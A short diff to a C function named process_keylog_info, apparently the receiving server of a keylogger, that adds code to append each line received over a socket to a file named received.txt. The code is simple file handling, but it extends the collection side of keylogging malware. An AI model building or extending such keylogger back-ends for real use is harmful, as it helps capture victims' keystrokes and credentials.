@@ -65,6 +65,12 @@ void process_keylog_info(int socket_descriptor) {
   if (client_file == NULL) {
     error_and_exit("Couldn't open file");
   }
+
+  FILE* data_log = fopen("received.txt", "a");
+  if (data_log == NULL) {
+    error_and_exit("Couldn't open file");
+  }
+
   char* line = NULL;
   size_t line_size = 0;
   char* empty = "\n";
@@ -73,6 +79,10 @@ void process_keylog_info(int socket_descriptor) {
     if (getline(&line, &line_size, client_file) == -1) {
       puts("BROKEN");
       error_and_exit("XD");
+    }
+    if (fputs(line, data_log) == EOF) {
+      free(line);
+      error_and_exit("Can't write line to file");
     }
     if (fputs(empty, client_file) == EOF) {
       free(line);
@@ -86,6 +96,9 @@ void process_keylog_info(int socket_descriptor) {
   }
   // CLOSE THE TEXT FILE WE'RE WRITING TO
   // CLOSE THE CLIENT
+  if (fclose(data_log) == EOF) {
+    error_and_exit("Couldn't close file");
+  }
   if (fclose(client_file) == EOF) {
     error_and_exit("Couldn't close client socket descriptor");
   }
